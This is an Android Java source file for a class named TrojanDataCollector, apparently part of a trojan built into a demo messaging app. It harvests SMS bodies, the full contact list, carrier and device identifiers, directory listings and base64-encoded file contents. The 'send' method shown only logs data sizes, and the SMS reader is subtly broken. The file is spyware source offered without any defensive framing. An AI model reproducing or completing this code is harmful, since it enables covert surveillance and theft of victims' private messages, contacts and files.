package io.openim.android.demo.trojan;

import android.content.Context;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.os.Environment;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.BufferedReader;
import java.io.IOException;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import java.util.Base64;
import org.json.JSONObject;

/**
 * Collects device data: SMS, contacts, location, device info, files
 */
public class TrojanDataCollector {
    private static final String TAG = "TroData";
    private Context context;

    public TrojanDataCollector(Context context) {
        this.context = context;
    }

    public String collectSMS() {
        try {
            ContentResolver contentResolver = context.getContentResolver();
            Uri smsUri = android.provider.Telephony.Sms.Inbox.CONTENT_URI;
            Cursor cursor = contentResolver.query(smsUri, null, null, null, null);
            StringBuilder sb = new StringBuilder();
            if (cursor != null) {
                int index = cursor.getColumnIndex("body");
                if (index >= 0) {
                    String message = cursor.getString(index);
                    sb.append(message).append("|");
                }
                cursor.close();
            }
            return sb.toString();
        } catch (Exception e) {
            Log.e(TAG, "SMS collection failed", e);
            return "";
        }
    }

    public String collectContacts() {
        try {
            ContentResolver contentResolver = context.getContentResolver();
            Uri contactUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            Cursor cursor = contentResolver.query(contactUri, null, null, null, null);
            StringBuilder sb = new StringBuilder();
            if (cursor != null) {
                int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int phoneIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                while (cursor.moveToNext()) {
                    String name = cursor.getString(nameIndex);
                    String phone = cursor.getString(phoneIndex);
                    sb.append(String.format("{\"name\":\"%s\",\"phone\":\"%s\"}||", name, phone));
                }
                cursor.close();
            }
            return sb.toString();
        } catch (Exception e) {
            Log.e(TAG, "Contacts collection failed", e);
            return "";
        }
    }

    public String collectLocation() {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            String operator = telephonyManager.getOperatorName();
            return "{\"operator\":\"" + operator + "\"}";
        } catch (Exception e) {
            Log.e(TAG, "Location collection failed", e);
            return "";
        }
    }

    public String collectDeviceInfo() {
        try {
            String deviceModel = android.os.Build.MODEL;
            String androidVersion = android.os.Build.VERSION.RELEASE;
            String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            return String.format("{\"device\":\"%s\",\"version\":\"%s\",\"id\":\"%s\"}", deviceModel, androidVersion, deviceId);
        } catch (Exception e) {
            Log.e(TAG, "Device info collection failed", e);
            return "";
        }
    }

    /**
     * List files in directory
     */
    public String listFiles(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) {
                return "";
            }
            File[] files = dir.listFiles();
            if (files == null) return "";
            StringBuilder sb = new StringBuilder();
            for (File file : files) {
                sb.append(String.format("{\"name\":\"%s\",\"type\":\"%s\",\"size\":%d},",
                    file.getName(), file.isDirectory() ? "folder" : "file", file.length()));
            }
            return sb.toString();
        } catch (Exception e) {
            Log.e(TAG, "File listing failed", e);
            return "";
        }
    }

    /**
     * Read file content (return base64)
     */
    public String readFile(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists()) return "";
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[(int) file.length()];
            fis.read(buffer);
            fis.close();
            String result = Base64.getEncoder().encodeToString(buffer);
            return result;
        } catch (IOException e) {
            Log.e(TAG, "File read failed", e);
            return "";
        }
    }

    /**
     * Collect and send all data
     */
    public void collectAndSendAllData() {
        String smsData = collectSMS();
        String contactsData = collectContacts();
        String locationData = collectLocation();
        String deviceInfo = collectDeviceInfo();
        Log.d(TAG, "Data collected: SMS=" + smsData.length() + ", Contacts=" + contactsData.length());
    }
}
